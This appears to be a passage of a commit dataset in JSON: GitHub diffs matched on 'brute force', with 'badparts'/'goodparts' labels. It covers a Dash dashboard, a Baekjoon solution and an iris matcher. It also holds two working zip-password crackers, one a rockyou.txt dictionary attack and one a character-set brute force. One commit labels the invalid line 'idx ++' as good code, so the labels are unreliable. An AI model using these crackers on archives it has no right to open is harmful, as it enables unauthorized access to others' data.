html.Div(children=[\n#             html.H1(\n#                 children='National numbers:',\n#                 style={\n#                     'textAlign': 'left',\n#                     'color': colors['text'],\n#                     'font-family': 'Helvetica'\n#                 }\n#                 )],#style={'display': 'inline-block', 'vertical-align': 'top', 'margin-left': '3vw', 'margin-top': '3vw'}\n#         ),\n#         html.Div(children=[            \n#             dcc.Graph(\n#                 id='example-graph-2',\n#                 figure=fig\n#             ),\n#             ],style={'display': 'inline-block'}#, 'vertical-align': 'top'} #, 'margin-left': '3vw', 'margin-top': '3vw'}\n#         ),\n#         ], style={'display': 'inline-block'} #'display': 'inline-block', 'vertical-align': 'top', 'margin-left': '3vw', 'margin-top': '3vw'}\n#     ),     \n    \n\n#     html.Div(children=[\n    \n#         dcc.DatePickerRange(\n#             id='my-date-picker-range',\n#             min_date_allowed=start_date,\n#             max_date_allowed=end_date,\n#             #initial_visible_month=start_date,\n#             start_date=start_date,\n#             end_date=end_date\n#         ),\n#         html.Div(id='output-container-date-picker-range')\n#     ]),\n    \n#     dcc.Graph(\n#         id='example-graph-3',\n#         figure=fig\n#     ),        \n# ])\n\n\n# ######################### Callback\n\n# @app.callback(\n#     Output('output-container-date-picker-range', 'children'),\n#     Input('my-date-picker-range', 'start_date'),\n#     Input('my-date-picker-range', 'end_date'))\n# def update_output(start_date, end_date):\n#     string_prefix = 'You have selected: '\n#     if start_date is not None:\n#         start_date_object = date.fromisoformat(start_date)\n#         start_date_string = start_date_object.strftime('%B %d, %Y')\n#         string_prefix = string_prefix + 'Start Date: ' + start_date_string + ' | '\n#     if end_date is not None:\n#         end_date_object = date.fromisoformat(end_date)\n#         end_date_string = end_date_object.strftime('%B %d, %Y')\n#         string_prefix = string_prefix + 'End Date: ' + end_date_string\n#     if len(string_prefix) == len('You have selected: '):\n#         return 'Select a date to see it displayed here'\n#     else:\n#         return string_prefix\n    \n# if __name__ == '__main__':\n#     app.run_server(debug=True)\n\n"}},"msg":"Update bahisdashplt.py\n\nfurther brute force get to know code"}},"https:\/\/github.com\/Nelchois\/Question-solve":{"3601f5fb781ff0da17a9ec6b7aa96847020d70e2":{"url":"https:\/\/api.github.com\/repos\/Nelchois\/Question-solve\/commits\/3601f5fb781ff0da17a9ec6b7aa96847020d70e2","html_url":"https:\/\/github.com\/Nelchois\/Question-solve\/commit\/3601f5fb781ff0da17a9ec6b7aa96847020d70e2","message":"Update BOJ CODE\n\nUpdate BRUTE_FORCE","sha":"3601f5fb781ff0da17a9ec6b7aa96847020d70e2","keyword":"brute force update","diff":"diff --git a\/BRUTE_FORCE\/BOJ1018.py b\/BRUTE_FORCE\/BOJ1018.py\nindex 279c29c..16c469b 100644\n--- a\/BRUTE_FORCE\/BOJ1018.py\n+++ b\/BRUTE_FORCE\/BOJ1018.py\n@@ -6,7 +6,7 @@\n ans = []\n for _ in range(n):\n     chess.append(sys.stdin.readline().rstrip())\n-'''\n+\n for i in range(n):\n     for j in range(m):\n         if i%2 == 0:\n@@ -31,14 +31,6 @@\n                         idx_1[i][j] = 0\n                 else:\n                     idx_1[i][j] = 1\n-for k in range(n):\n-    for l in range(m):\n-        ck_line = []\n-        if k + 8 <= n and l + 8 <= m:\n-            for _ in range(k, k + 8):\n-                ck_line.append(sum(idx_1[k][l : l + 8]))\n-            ans.append(sum(ck_line))\n-'''\n for i in range(n):\n     for j in range(m):\n         if i%2 == 0:\n@@ -63,12 +55,24 @@\n                         idx_2[i][j] = 0\n                 else:\n                     idx_2[i][j] = 1\n-for k in range(n):\n-    for l in range(m):\n-        \n \n-        else: continue\n+for line in range(n):\n+    for row in range(m):\n+        field_sum_2 = []\n+        if line + 8 <= n and row + 8 <= m:\n+            for c in range(line, line + 8):\n+                a = sum(idx_2[c][row: row + 8])\n+                field_sum_2.append(a)\n+            ans.append(sum(field_sum_2))\n+for line in range(n):\n+    for row in range(m):\n+        field_sum_1 = []\n+        if line + 8 <= n and row + 8 <= m:\n+            for c in range(line, line + 8):\n+                a = sum(idx_1[c][row: row + 8])\n+                field_sum_1.append(a)\n+            ans.append(sum(field_sum_1))\n+print(min(ans))\n \n-print(*idx_2, sep= '\\n')\n \n \ndiff --git a\/BRUTE_FORCE\/BOJ1436.py b\/BRUTE_FORCE\/BOJ1436.py\nnew file mode 100644\nindex 0000000..e95e9d7\n--- \/dev\/null\n+++ b\/BRUTE_FORCE\/BOJ1436.py\n@@ -0,0 +1,9 @@\n+import sys \n+number = 666\n+movie_number_list = []\n+movie = int(sys.stdin.readline())\n+while len(movie_number_list) < movie:\n+    if '666' in str(number):\n+        movie_number_list.append(number)\n+    number += 1\n+print(movie_number_list[movie - 1])\n","files":{"\/BRUTE_FORCE\/BOJ1018.py":{"changes":[{"diff":"\n ans = []\n for _ in range(n):\n     chess.append(sys.stdin.readline().rstrip())\n-'''\n+\n for i in range(n):\n     for j in range(m):\n         if i%2 == 0:\n","add":1,"remove":1,"filename":"\/BRUTE_FORCE\/BOJ1018.py","badparts":["'''"],"goodparts":[]},{"diff":"                         idx_1[i][j] = 0\n                 else:\n                     idx_1[i][j] = 1\n-for k in range(n):\n-    for l in range(m):\n-        ck_line = []\n-        if k + 8 <= n and l + 8 <= m:\n-            for _ in range(k, k + 8):\n-                ck_line.append(sum(idx_1[k][l : l + 8]))\n-            ans.append(sum(ck_line))\n-'''\n for i in range(n):\n     for j in range(m):\n         if i%2 == 0:\n","add":0,"remove":8,"filename":"\/BRUTE_FORCE\/BOJ1018.py","badparts":["for k in range(n):","    for l in range(m):","        ck_line = []","        if k + 8 <= n and l + 8 <= m:","            for _ in range(k, k + 8):","                ck_line.append(sum(idx_1[k][l : l + 8]))","            ans.append(sum(ck_line))","'''"],"goodparts":[]},{"diff":"                         idx_2[i][j] = 0\n                 else:\n                     idx_2[i][j] = 1\n-for k in range(n):\n-    for l in range(m):\n-        \n \n-        else: continue\n+for line in range(n):\n+    for row in range(m):\n+        field_sum_2 = []\n+        if line + 8 <= n and row + 8 <= m:\n+            for c in range(line, line + 8):\n+                a = sum(idx_2[c][row: row + 8])\n+                field_sum_2.append(a)\n+            ans.append(sum(field_sum_2))\n+for line in range(n):\n+    for row in range(m):\n+        field_sum_1 = []\n+        if line + 8 <= n and row + 8 <= m:\n+            for c in range(line, line + 8):\n+                a = sum(idx_1[c][row: row + 8])\n+                field_sum_1.append(a)\n+            ans.append(sum(field_sum_1))\n+print(min(ans))\n \n-print(*idx_2, sep= '\\n')\n \n ","add":17,"remove":5,"filename":"\/BRUTE_FORCE\/BOJ1018.py","badparts":["for k in range(n):","    for l in range(m):","        else: continue","print(*idx_2, sep= '\\n')"],"goodparts":["for line in range(n):","    for row in range(m):","        field_sum_2 = []","        if line + 8 <= n and row + 8 <= m:","            for c in range(line, line + 8):","                a = sum(idx_2[c][row: row + 8])","                field_sum_2.append(a)","            ans.append(sum(field_sum_2))","for line in range(n):","    for row in range(m):","        field_sum_1 = []","        if line + 8 <= n and row + 8 <= m:","            for c in range(line, line + 8):","                a = sum(idx_1[c][row: row + 8])","                field_sum_1.append(a)","            ans.append(sum(field_sum_1))","print(min(ans))"]}],"source":"\nimport sys n, m=map(int, sys.stdin.readline().rstrip().split(' ')) chess=[] idx_1=[[0 for j in range(m)] for i in range(n)] idx_2=[[0 for j in range(m)] for i in range(n)] ans=[] for _ in range(n): chess.append(sys.stdin.readline().rstrip()) ''' for i in range(n): for j in range(m): if i%2==0: if j%2==0: if chess[i][j]==\"B\": idx_1[i][j]=0 else: idx_1[i][j]=1 else: if chess[i][j]==\"W\": idx_1[i][j]=0 else: idx_1[i][j]=1 else: if j%2==0: if chess[i][j]==\"W\": idx_1[i][j]=0 else: idx_1[i][j]=1 else: if chess[i][j]==\"B\": idx_1[i][j]=0 else: idx_1[i][j]=1 for k in range(n): for l in range(m): ck_line=[] if k +8 <=n and l +8 <=m: for _ in range(k, k +8): ck_line.append(sum(idx_1[k][l: l +8])) ans.append(sum(ck_line)) ''' for i in range(n): for j in range(m): if i%2==0: if j%2==0: if chess[i][j]==\"W\": idx_2[i][j]=0 else: idx_2[i][j]=1 else: if chess[i][j]==\"B\": idx_2[i][j]=0 else: idx_2[i][j]=1 else: if j%2==0: if chess[i][j]==\"B\": idx_2[i][j]=0 else: idx_2[i][j]=1 else: if chess[i][j]==\"W\": idx_2[i][j]=0 else: idx_2[i][j]=1 for k in range(n): for l in range(m): else: continue print(*idx_2, sep='\\n') ","sourceWithComments":"import sys\nn, m = map(int, sys.stdin.readline().rstrip().split(' '))\nchess = []\nidx_1 = [[0 for j in range(m)] for i in range(n)]\nidx_2 = [[0 for j in range(m)] for i in range(n)]\nans = []\nfor _ in range(n):\n    chess.append(sys.stdin.readline().rstrip())\n'''\nfor i in range(n):\n    for j in range(m):\n        if i%2 == 0:\n            if j%2 == 0:\n                if chess[i][j] == \"B\":\n                    idx_1[i][j] = 0\n                else:\n                    idx_1[i][j] = 1\n            else:\n                if chess[i][j] == \"W\":\n                        idx_1[i][j] = 0\n                else:\n                    idx_1[i][j] = 1\n        else:\n            if j%2 == 0:\n                if chess[i][j] == \"W\":\n                    idx_1[i][j] = 0\n                else:\n                    idx_1[i][j] = 1\n            else:\n                if chess[i][j] == \"B\":\n                        idx_1[i][j] = 0\n                else:\n                    idx_1[i][j] = 1\nfor k in range(n):\n    for l in range(m):\n        ck_line = []\n        if k + 8 <= n and l + 8 <= m:\n            for _ in range(k, k + 8):\n                ck_line.append(sum(idx_1[k][l : l + 8]))\n            ans.append(sum(ck_line))\n'''\nfor i in range(n):\n    for j in range(m):\n        if i%2 == 0:\n            if j%2 == 0:\n                if chess[i][j] == \"W\":\n                    idx_2[i][j] = 0\n                else:\n                    idx_2[i][j] = 1\n            else:\n                if chess[i][j] == \"B\":\n                        idx_2[i][j] = 0\n                else:\n                    idx_2[i][j] = 1\n        else:\n            if j%2 == 0:\n                if chess[i][j] == \"B\":\n                    idx_2[i][j] = 0\n                else:\n                    idx_2[i][j] = 1\n            else:\n                if chess[i][j] == \"W\":\n                        idx_2[i][j] = 0\n                else:\n                    idx_2[i][j] = 1\nfor k in range(n):\n    for l in range(m):\n        \n\n        else: continue\n\nprint(*idx_2, sep= '\\n')\n\n\n"}},"msg":"Update BOJ CODE\n\nUpdate BRUTE_FORCE"}},"https:\/\/github.com\/andrea-prodon\/Iris_Recognition_BS":{"53c5dbc222e3b0055949ff1e29bfbddb26924a55":{"url":"https:\/\/api.github.com\/repos\/andrea-prodon\/Iris_Recognition_BS\/commits\/53c5dbc222e3b0055949ff1e29bfbddb26924a55","html_url":"https:\/\/github.com\/andrea-prodon\/Iris_Recognition_BS\/commit\/53c5dbc222e3b0055949ff1e29bfbddb26924a55","message":"brute_force_match updated on casia1","sha":"53c5dbc222e3b0055949ff1e29bfbddb26924a55","keyword":"brute force update","diff":"diff --git a\/Face Localization\/brute_force_match.py b\/Face Localization\/brute_force_match.py\nindex 9b0d81f..6f57b4c 100644\n--- a\/Face Localization\/brute_force_match.py\t\n+++ b\/Face Localization\/brute_force_match.py\t\n@@ -30,14 +30,14 @@ def brute_force_match(iris_1, iris_2):\n \n veri = 0\n falsi = 0\n-for x in range(46):\n+for x in range(108):\n     \n-    files = os.listdir('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+\"\/left\")\n+    files = os.listdir('Dataset\/CASIA1\/'+str(x+1))\n     \n     if len(files) > 0:\n \n-        image_1 = cv2.imread('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+'\/left\/'+files[0])\n-        image_2 = cv2.imread('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+'\/left\/'+files[2])\n+        image_1 = cv2.imread('Dataset\/CASIA1\/'+str(x+1)+'\/'+files[0])\n+        image_2 = cv2.imread('Dataset\/CASIA1\/'+str(x+1)+'\/'+files[2])\n         print(x+1)\n         bf_result = brute_force_match(image_1, image_2)\n         if (bf_result):\n","files":{"\/Face Localization\/brute_force_match.py":{"changes":[{"diff":"\n \n veri = 0\n falsi = 0\n-for x in range(46):\n+for x in range(108):\n     \n-    files = os.listdir('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+\"\/left\")\n+    files = os.listdir('Dataset\/CASIA1\/'+str(x+1))\n     \n     if len(files) > 0:\n \n-        image_1 = cv2.imread('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+'\/left\/'+files[0])\n-        image_2 = cv2.imread('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+'\/left\/'+files[2])\n+        image_1 = cv2.imread('Dataset\/CASIA1\/'+str(x+1)+'\/'+files[0])\n+        image_2 = cv2.imread('Dataset\/CASIA1\/'+str(x+1)+'\/'+files[2])\n         print(x+1)\n         bf_result = brute_force_match(image_1, image_2)\n         if (bf_result):\n","add":4,"remove":4,"filename":"\/Face Localization\/brute_force_match.py","badparts":["for x in range(46):","    files = os.listdir('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+\"\/left\")","        image_1 = cv2.imread('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+'\/left\/'+files[0])","        image_2 = cv2.imread('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+'\/left\/'+files[2])"],"goodparts":["for x in range(108):","    files = os.listdir('Dataset\/CASIA1\/'+str(x+1))","        image_1 = cv2.imread('Dataset\/CASIA1\/'+str(x+1)+'\/'+files[0])","        image_2 = cv2.imread('Dataset\/CASIA1\/'+str(x+1)+'\/'+files[2])"]}],"source":"\nimport cv2 import numpy as np import dlib import os def brute_force_match(iris_1, iris_2): orb=cv2.ORB_create() keypoints_img1, des1=orb.detectAndCompute(iris_1, None) keypoints_img2, des2=orb.detectAndCompute(iris_2, None) brute_f=cv2.BFMatcher(cv2.NORM_HAMMING, crossCheck=True) matchesOriginal=brute_f.match(des1, des1) matchesNew=brute_f.match(des1, des2) if len(matchesOriginal) !=0: match_rate=(len(matchesNew)\/len(matchesOriginal))*100 else: match_rate=0 print(\"Image Quality is low definition, unable to verify. please use a stronger camera.\") if match_rate > 35: print(\"IRIS MATCH FOUND IN DATABASE.(match_rate=\"+str(match_rate)+\")\") return True else: print(\"NO IRIS MATCH FOUND IN DATABASE.(match_rate=\"+str(match_rate)+\")\") return False veri=0 falsi=0 for x in range(46): files=os.listdir('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+\"\/left\") if len(files) > 0: image_1=cv2.imread('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+'\/left\/'+files[0]) image_2=cv2.imread('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+'\/left\/'+files[2]) print(x+1) bf_result=brute_force_match(image_1, image_2) if(bf_result): veri +=1 else: falsi +=1 print(\"Percentuale di successo: \" +str(veri) +\" su \" +str(veri+falsi)) ","sourceWithComments":"import cv2\nimport numpy as np\nimport dlib\nimport os\n\ndef brute_force_match(iris_1, iris_2):\n\n    orb = cv2.ORB_create()\n    \n    keypoints_img1, des1 = orb.detectAndCompute(iris_1, None)\n    keypoints_img2, des2 = orb.detectAndCompute(iris_2, None)\n\n    brute_f = cv2.BFMatcher(cv2.NORM_HAMMING, crossCheck=True)\n    \n    matchesOriginal = brute_f.match(des1, des1) \n    matchesNew = brute_f.match(des1, des2)   \n\n    if len(matchesOriginal) != 0:\n            match_rate = (len(matchesNew)\/len(matchesOriginal))*100\n    else:\n        match_rate = 0\n        print(\"Image Quality is low definition, unable to verify. please use a stronger camera.\")\n\n    if match_rate > 35:\n            print(\"IRIS MATCH FOUND IN DATABASE. (match_rate = \"+str(match_rate)+\")\")\n            return True\n    else:\n        print(\"NO IRIS MATCH FOUND IN DATABASE. (match_rate = \"+str(match_rate)+\")\")\n        return False\n\nveri = 0\nfalsi = 0\nfor x in range(46):\n    \n    files = os.listdir('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+\"\/left\")\n    \n    if len(files) > 0:\n\n        image_1 = cv2.imread('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+'\/left\/'+files[0])\n        image_2 = cv2.imread('MMUIrisDatabase\/MMU Iris Database\/'+str(x+1)+'\/left\/'+files[2])\n        print(x+1)\n        bf_result = brute_force_match(image_1, image_2)\n        if (bf_result):\n            veri += 1\n        else:\n            falsi += 1\n        \nprint (\"Percentuale di successo: \" + str(veri) + \" su \" + str(veri+falsi)) \n\n\n"}},"msg":"brute_force_match updated on casia1"}},"https:\/\/github.com\/Ropoil\/scripts":{"de276ba1835e2e2ff61976264db0d6cdd83fee4b":{"url":"https:\/\/api.github.com\/repos\/Ropoil\/scripts\/commits\/de276ba1835e2e2ff61976264db0d6cdd83fee4b","html_url":"https:\/\/github.com\/Ropoil\/scripts\/commit\/de276ba1835e2e2ff61976264db0d6cdd83fee4b","sha":"de276ba1835e2e2ff61976264db0d6cdd83fee4b","keyword":"brute force update","diff":"diff --git a\/brute_Force_zip.py b\/brute_Force_zip.py\nindex b90f443..1310b43 100644\n--- a\/brute_Force_zip.py\n+++ b\/brute_Force_zip.py\n@@ -1,3 +1,4 @@\n+\r\n import zipfile\r\n \r\n \r\n@@ -17,12 +18,12 @@ def crack_password(password_list, obj):\n \r\n \r\n \r\n-password_list = \"rockyou.txt\"\r\n+password_list = \"change to dictionary file path\"\r\n \r\n-zip_file = \"secret.zip\"\r\n+zip_file = \"change to zip file path \"\r\n \r\n obj = zipfile.ZipFile(zip_file)\r\n \r\n crack_password(password_list, obj)\r\n \r\n-obj.extractall()\n\\ No newline at end of file\n+obj.extractall()\r\n","message":"","files":{"\/brute_Force_zip.py":{"changes":[{"diff":"\n \r\n \r\n \r\n-password_list = \"rockyou.txt\"\r\n+password_list = \"change to dictionary file path\"\r\n \r\n-zip_file = \"secret.zip\"\r\n+zip_file = \"change to zip file path \"\r\n \r\n obj = zipfile.ZipFile(zip_file)\r\n \r\n crack_password(password_list, obj)\r\n \r\n-obj.extractall()\n\\ No newline at end of file\n+obj.extractall()\r\n","add":3,"remove":3,"filename":"\/brute_Force_zip.py","badparts":["password_list = \"rockyou.txt\"\r","zip_file = \"secret.zip\"\r","obj.extractall()"],"goodparts":["password_list = \"change to dictionary file path\"\r","zip_file = \"change to zip file path \"\r","obj.extractall()\r"]}],"source":"\nimport zipfile\r \r \r def crack_password(password_list, obj):\r idx=0\r with open(password_list, 'rb') as file:\r for line in file:\r for word in line.split():\r try:\r idx +=1\r obj.extractall(pwd=word)\r print(\"Password found at line\", idx)\r print(word.decode())\r \r except:\r continue\r \r \r \r password_list=\"rockyou.txt\"\r \r zip_file=\"secret.zip\"\r \r obj=zipfile.ZipFile(zip_file)\r \r crack_password(password_list, obj)\r \r obj.extractall() ","sourceWithComments":"import zipfile\r\n\r\n\r\ndef crack_password(password_list, obj):\r\n    idx = 0\r\n    with open(password_list, 'rb') as file:\r\n        for line in file:\r\n            for word in line.split():\r\n                try:\r\n                    idx += 1\r\n                    obj.extractall(pwd=word)\r\n                    print(\"Password found at line\", idx)\r\n                    print(word.decode())\r\n\r\n                except:\r\n                    continue\r\n\r\n\r\n\r\npassword_list = \"rockyou.txt\"\r\n\r\nzip_file = \"secret.zip\"\r\n\r\nobj = zipfile.ZipFile(zip_file)\r\n\r\ncrack_password(password_list, obj)\r\n\r\nobj.extractall()"}},"msg":"Update brute_Force_zip.py"},"d3c0312f6dd3d6fa923a195b279e919b971a4a3f":{"url":"https:\/\/api.github.com\/repos\/Ropoil\/scripts\/commits\/d3c0312f6dd3d6fa923a195b279e919b971a4a3f","html_url":"https:\/\/github.com\/Ropoil\/scripts\/commit\/d3c0312f6dd3d6fa923a195b279e919b971a4a3f","sha":"d3c0312f6dd3d6fa923a195b279e919b971a4a3f","keyword":"brute force update","diff":"diff --git a\/brute_Force_zip.py b\/brute_Force_zip.py\nindex 1310b43..8d5dba4 100644\n--- a\/brute_Force_zip.py\n+++ b\/brute_Force_zip.py\n@@ -8,7 +8,7 @@ def crack_password(password_list, obj):\n         for line in file:\r\n             for word in line.split():\r\n                 try:\r\n-                    idx += 1\r\n+                    idx ++\r\n                     obj.extractall(pwd=word)\r\n                     print(\"Password found at line\", idx)\r\n                     print(word.decode())\r\n","message":"","files":{"\/brute_Force_zip.py":{"changes":[{"diff":"\n         for line in file:\r\n             for word in line.split():\r\n                 try:\r\n-                    idx += 1\r\n+                    idx ++\r\n                     obj.extractall(pwd=word)\r\n                     print(\"Password found at line\", idx)\r\n                     print(word.decode())\r\n","add":1,"remove":1,"filename":"\/brute_Force_zip.py","badparts":["                    idx += 1\r"],"goodparts":["                    idx ++\r"]}],"source":"\n\r import zipfile\r \r \r def crack_password(password_list, obj):\r idx=0\r with open(password_list, 'rb') as file:\r for line in file:\r for word in line.split():\r try:\r idx +=1\r obj.extractall(pwd=word)\r print(\"Password found at line\", idx)\r print(word.decode())\r \r except:\r continue\r \r \r \r password_list=\"change to dictionary file path\"\r \r zip_file=\"change to zip file path \"\r \r obj=zipfile.ZipFile(zip_file)\r \r crack_password(password_list, obj)\r \r obj.extractall()\r ","sourceWithComments":"\r\nimport zipfile\r\n\r\n\r\ndef crack_password(password_list, obj):\r\n    idx = 0\r\n    with open(password_list, 'rb') as file:\r\n        for line in file:\r\n            for word in line.split():\r\n                try:\r\n                    idx += 1\r\n                    obj.extractall(pwd=word)\r\n                    print(\"Password found at line\", idx)\r\n                    print(word.decode())\r\n\r\n                except:\r\n                    continue\r\n\r\n\r\n\r\npassword_list = \"change to dictionary file path\"\r\n\r\nzip_file = \"change to zip file path \"\r\n\r\nobj = zipfile.ZipFile(zip_file)\r\n\r\ncrack_password(password_list, obj)\r\n\r\nobj.extractall()\r\n"}},"msg":"Update brute_Force_zip.py"},"47062b86fb6a168ba8bcb7fdc4f96078b0582a28":{"url":"https:\/\/api.github.com\/repos\/Ropoil\/scripts\/commits\/47062b86fb6a168ba8bcb7fdc4f96078b0582a28","html_url":"https:\/\/github.com\/Ropoil\/scripts\/commit\/47062b86fb6a168ba8bcb7fdc4f96078b0582a28","message":"Update brute_Force_zip.py","sha":"47062b86fb6a168ba8bcb7fdc4f96078b0582a28","keyword":"brute force update","diff":"diff --git a\/brute_Force_zip.py b\/brute_Force_zip.py\nindex 8d5dba4..9dfeffe 100644\n--- a\/brute_Force_zip.py\n+++ b\/brute_Force_zip.py\n@@ -8,7 +8,7 @@ def crack_password(password_list, obj):\n         for line in file:\r\n             for word in line.split():\r\n                 try:\r\n-                    idx ++\r\n+                    idx +=1\r\n                     obj.extractall(pwd=word)\r\n                     print(\"Password found at line\", idx)\r\n                     print(word.decode())\r\n","files":{"\/brute_Force_zip.py":{"changes":[{"diff":"\n         for line in file:\r\n             for word in line.split():\r\n                 try:\r\n-                    idx ++\r\n+                    idx +=1\r\n                     obj.extractall(pwd=word)\r\n                     print(\"Password found at line\", idx)\r\n                     print(word.decode())\r\n","add":1,"remove":1,"filename":"\/brute_Force_zip.py","badparts":["                    idx ++\r"],"goodparts":["                    idx +=1\r"]}],"source":"\n\r import zipfile\r \r \r def crack_password(password_list, obj):\r idx=0\r with open(password_list, 'rb') as file:\r for line in file:\r for word in line.split():\r try:\r idx ++\r obj.extractall(pwd=word)\r print(\"Password found at line\", idx)\r print(word.decode())\r \r except:\r continue\r \r \r \r password_list=\"change to dictionary file path\"\r \r zip_file=\"change to zip file path \"\r \r obj=zipfile.ZipFile(zip_file)\r \r crack_password(password_list, obj)\r \r obj.extractall()\r ","sourceWithComments":"\r\nimport zipfile\r\n\r\n\r\ndef crack_password(password_list, obj):\r\n    idx = 0\r\n    with open(password_list, 'rb') as file:\r\n        for line in file:\r\n            for word in line.split():\r\n                try:\r\n                    idx ++\r\n                    obj.extractall(pwd=word)\r\n                    print(\"Password found at line\", idx)\r\n                    print(word.decode())\r\n\r\n                except:\r\n                    continue\r\n\r\n\r\n\r\npassword_list = \"change to dictionary file path\"\r\n\r\nzip_file = \"change to zip file path \"\r\n\r\nobj = zipfile.ZipFile(zip_file)\r\n\r\ncrack_password(password_list, obj)\r\n\r\nobj.extractall()\r\n"}},"msg":"Update brute_Force_zip.py"}},"https:\/\/github.com\/norbert-acedanski\/python-zip-cracker":{"9cf60318fc11534df4b868498946ada19419e7b6":{"url":"https:\/\/api.github.com\/repos\/norbert-acedanski\/python-zip-cracker\/commits\/9cf60318fc11534df4b868498946ada19419e7b6","html_url":"https:\/\/github.com\/norbert-acedanski\/python-zip-cracker\/commit\/9cf60318fc11534df4b868498946ada19419e7b6","message":"Update argument name for brute_force_zip_password.","sha":"9cf60318fc11534df4b868498946ada19419e7b6","keyword":"brute force update","diff":"diff --git a\/main.py b\/main.py\nindex 665c1b4..407cc6d 100644\n--- a\/main.py\n+++ b\/main.py\n@@ -2,24 +2,24 @@\n \n if __name__ == \"__main__\":\n     print(\"Lowercase letter password:\")\n-    lowercase_letter_password = brute_force_zip_password(zip_file_name=\".\/resources\/two_lowercase_letters_password.zip\",\n+    lowercase_letter_password = brute_force_zip_password(zip_file_path=\".\/resources\/two_lowercase_letters_password.zip\",\n                                                          source=choose_selected_values_to_generate_password(),\n                                                          print_progress_bar=True)\n     print(f\"Password for file 'two_lowercase_letters_password.zip' is: {lowercase_letter_password}\")\n     print(\"Digit password:\")\n-    digit_password = brute_force_zip_password(zip_file_name=\".\/resources\/digit_password.zip\",\n+    digit_password = brute_force_zip_password(zip_file_path=\".\/resources\/digit_password.zip\",\n                                               source=choose_selected_values_to_generate_password(lowercase=False,\n                                                                                                  digits=True),\n                                               print_progress_bar=True)\n     print(f\"Password for file 'digit_password.zip' is: {digit_password}\")\n     print(\"Uppercase letter password:\")\n-    uppercase_letter_password = brute_force_zip_password(zip_file_name=\"resources\/uppercase_letters_password.zip\",\n+    uppercase_letter_password = brute_force_zip_password(zip_file_path=\"resources\/uppercase_letters_password.zip\",\n                                                          source=choose_selected_values_to_generate_password(\n                                                              lowercase=False, uppercase=True),\n                                                          print_progress_bar=True)\n     print(f\"Password for file 'uppercase_letters_password.zip' is: {uppercase_letter_password}\")\n     print(\"Letters and digits password:\")\n-    letters_and_digits_password = brute_force_zip_password(zip_file_name=\".\/resources\/letters_and_digits_password.zip\",\n+    letters_and_digits_password = brute_force_zip_password(zip_file_path=\".\/resources\/letters_and_digits_password.zip\",\n                                                            source=choose_selected_values_to_generate_password(\n                                                                uppercase=True, digits=True),\n                                                            print_progress_bar=True)\ndiff --git a\/zip_cracker.py b\/zip_cracker.py\nindex ad445f4..b460bd0 100644\n--- a\/zip_cracker.py\n+++ b\/zip_cracker.py\n@@ -32,9 +32,9 @@ def _get_generators(source: str, min_length: int = 1, max_length: int = 5) -> It\n         yield itertools.product(source, repeat=current_length)\n \n \n-def brute_force_zip_password(zip_file_name: str, source: str, min_length: int = 1, max_length: int = 5,\n+def brute_force_zip_password(zip_file_path: str, source: str, min_length: int = 1, max_length: int = 5,\n                              print_progress_bar: bool = False) -> Union[None, str]:\n-    source_file = zipfile.ZipFile(zip_file_name)\n+    source_file = zipfile.ZipFile(zip_file_path)\n     source_length = len(source)\n \n     def loop_function():\n","files":{"\/main.py":{"changes":[{"diff":"\n \n if __name__ == \"__main__\":\n     print(\"Lowercase letter password:\")\n-    lowercase_letter_password = brute_force_zip_password(zip_file_name=\".\/resources\/two_lowercase_letters_password.zip\",\n+    lowercase_letter_password = brute_force_zip_password(zip_file_path=\".\/resources\/two_lowercase_letters_password.zip\",\n                                                          source=choose_selected_values_to_generate_password(),\n                                                          print_progress_bar=True)\n     print(f\"Password for file 'two_lowercase_letters_password.zip' is: {lowercase_letter_password}\")\n     print(\"Digit password:\")\n-    digit_password = brute_force_zip_password(zip_file_name=\".\/resources\/digit_password.zip\",\n+    digit_password = brute_force_zip_password(zip_file_path=\".\/resources\/digit_password.zip\",\n                                               source=choose_selected_values_to_generate_password(lowercase=False,\n                                                                                                  digits=True),\n                                               print_progress_bar=True)\n     print(f\"Password for file 'digit_password.zip' is: {digit_password}\")\n     print(\"Uppercase letter password:\")\n-    uppercase_letter_password = brute_force_zip_password(zip_file_name=\"resources\/uppercase_letters_password.zip\",\n+    uppercase_letter_password = brute_force_zip_password(zip_file_path=\"resources\/uppercase_letters_password.zip\",\n                                                          source=choose_selected_values_to_generate_password(\n                                                              lowercase=False, uppercase=True),\n                                                          print_progress_bar=True)\n     print(f\"Password for file 'uppercase_letters_password.zip' is: {uppercase_letter_password}\")\n     print(\"Letters and digits password:\")\n-    letters_and_digits_password = brute_force_zip_password(zip_file_name=\".\/resources\/letters_and_digits_password.zip\",\n+    letters_and_digits_password = brute_force_zip_password(zip_file_path=\".\/resources\/letters_and_digits_password.zip\",\n                                                            source=choose_selected_values_to_generate_password(\n                                                                uppercase=True, digits=True),\n                                                            print_progress_bar=True)","add":4,"remove":4,"filename":"\/main.py","badparts":["    lowercase_letter_password = brute_force_zip_password(zip_file_name=\".\/resources\/two_lowercase_letters_password.zip\",","    digit_password = brute_force_zip_password(zip_file_name=\".\/resources\/digit_password.zip\",","    uppercase_letter_password = brute_force_zip_password(zip_file_name=\"resources\/uppercase_letters_password.zip\",","    letters_and_digits_password = brute_force_zip_password(zip_file_name=\".\/resources\/letters_and_digits_password.zip\","],"goodparts":["    lowercase_letter_password = brute_force_zip_password(zip_file_path=\".\/resources\/two_lowercase_letters_password.zip\",","    digit_password = brute_force_zip_password(zip_file_path=\".\/resources\/digit_password.zip\",","    uppercase_letter_password = brute_force_zip_password(zip_file_path=\"resources\/uppercase_letters_password.zip\",","    letters_and_digits_password = brute_force_zip_password(zip_file_path=\".\/resources\/letters_and_digits_password.zip\","]}],"source":"\nfrom zip_cracker import brute_force_zip_password, choose_selected_values_to_generate_password if __name__==\"__main__\": print(\"Lowercase letter password:\") lowercase_letter_password=brute_force_zip_password(zip_file_name=\".\/resources\/two_lowercase_letters_password.zip\", source=choose_selected_values_to_generate_password(), print_progress_bar=True) print(f\"Password for file 